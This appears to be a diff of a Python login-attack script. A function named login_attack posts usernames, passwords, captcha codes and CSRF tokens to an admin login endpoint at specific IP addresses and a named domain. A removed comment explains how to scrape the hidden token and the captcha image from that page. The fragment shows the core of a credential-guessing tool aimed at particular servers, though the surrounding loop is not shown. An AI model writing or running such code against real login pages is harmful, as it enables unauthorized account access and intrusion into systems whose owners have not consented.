@@ -81,10 +81,9 @@ def login_token():
     return token
 
 
-def login_attack(username, password, code, token):
+def login_attack(username, password, code, token):  # ip.addr == 104.233.197.195 and http
     # 请求参数
-    # data = {'name': username, 'password': password, 'captcha': code, '__token__': token}
-    data = "name={0}&password={1}&captcha={2}&__token__={3}".format(username, password, code, token)
+    data = "name={0}&password={1}&captcha={2}&__token__={3}".format(username, password, code, token)  # 正确的
     print(data)
     header = {
         'X-Requested-With': 'XMLHttpRequest',
@@ -100,7 +99,6 @@ def login_attack(username, password, code, token):
     return result
 
 
-#  python http://www.ximimim.top:1008/admin/common/login.shtml 获取 这个页面中 <input type="hidden" name="__token__" value="xx"> 其中value的值 和 获取标签id等于captcha的img 图标内容 并且写入文件中
 def main():
     # url = "http://47.109.19.59:7070/admin/common/login.shtml"
     url = "http://47.109.19.59:7070"
